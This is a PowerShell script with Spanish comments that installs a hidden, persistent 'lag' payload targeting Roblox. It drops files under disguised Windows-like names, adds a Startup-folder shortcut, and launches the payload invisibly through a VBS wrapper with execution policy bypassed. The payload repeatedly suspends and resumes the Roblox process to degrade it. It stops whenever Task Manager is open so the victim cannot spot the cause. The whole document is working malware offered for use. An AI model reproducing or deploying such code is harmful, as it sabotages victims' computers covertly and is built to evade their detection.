# --- CONFIGURACIÓN DE RUTAS (Modo Usuario) ---
$dir = "$env:LOCALAPPDATA\WinSystem"
if (-not (Test-Path $dir)) { New-Item -Path $dir -ItemType Directory }

$psFile = "$dir\TaskHostWin.ps1"
$vbsFile = "$dir\Launcher.vbs"
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinSystemUpdate.lnk"

# --- 1. CONTENIDO DEL SCRIPT DE LAG (TaskHostWin.ps1) ---
$psContent = @"
`$code = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("ntdll.dll")]
    public static extern uint NtSuspendProcess(IntPtr processHandle);
    [DllImport("ntdll.dll")]
    public static extern uint NtResumeProcess(IntPtr processHandle);
}
"@
try { Add-Type -TypeDefinition `$code -ErrorAction SilentlyContinue } catch {}
`$windowTitle = "*Roblox*"
while(`$true) {
    if (Get-Process -Name "taskmgr" -ErrorAction SilentlyContinue) { Start-Sleep -Seconds 5; continue }
    `$roblox = Get-Process | Where-Object { `$_.MainWindowTitle -like `$windowTitle }
    if (`$roblox) {
        `$pHandle = `$roblox.Handle; `$RobloxId = `$roblox.Id
        Start-Sleep -Seconds (Get-Random -Minimum 60 -Maximum 180)
        for (`$i = 1; `$i -le 300; `$i++) {
            if (Get-Process -Name "taskmgr" -ErrorAction SilentlyContinue) { [Win32]::NtResumeProcess(`$pHandle); break }
            if (-not (Get-Process -Id `$RobloxId -ErrorAction SilentlyContinue)) { break }
            `$sus = [math]::Min(98, (`$i / 300) * 98)
            [Win32]::NtSuspendProcess(`$pHandle); Start-Sleep -Milliseconds `$sus
            [Win32]::NtResumeProcess(`$pHandle); Start-Sleep -Milliseconds (100 - `$sus)
        }
        while (Get-Process -Id `$RobloxId -ErrorAction SilentlyContinue) {
            if (Get-Process -Name "taskmgr" -ErrorAction SilentlyContinue) { [Win32]::NtResumeProcess(`$pHandle); break }
            [Win32]::NtSuspendProcess(`$pHandle); Start-Sleep -Milliseconds 99
            [Win32]::NtResumeProcess(`$pHandle); Start-Sleep -Milliseconds 1
        }
    }
    Start-Sleep -Seconds 15
}
"@

# --- 2. CONTENIDO DEL LANZADOR INVISIBLE (Launcher.vbs) ---
$vbsContent = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"powershell.exe -ExecutionPolicy Bypass -File `"`"$psFile`"`"`", 0, False"

# --- 3. CREACIÓN DE ARCHIVOS ---
Set-Content -Path $psFile -Value $psContent -Force
Set-Content -Path $vbsFile -Value $vbsContent -Force

# --- 4. CREACIÓN DEL ACCESO DIRECTO ---
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($startupPath)
$Shortcut.TargetPath = "wscript.exe"
$Shortcut.Arguments = "`"$vbsFile`""
$Shortcut.Save()

# --- 5. EJECUCIÓN INMEDIATA ---
Start-Process "wscript.exe" -ArgumentList "`"$vbsFile`""
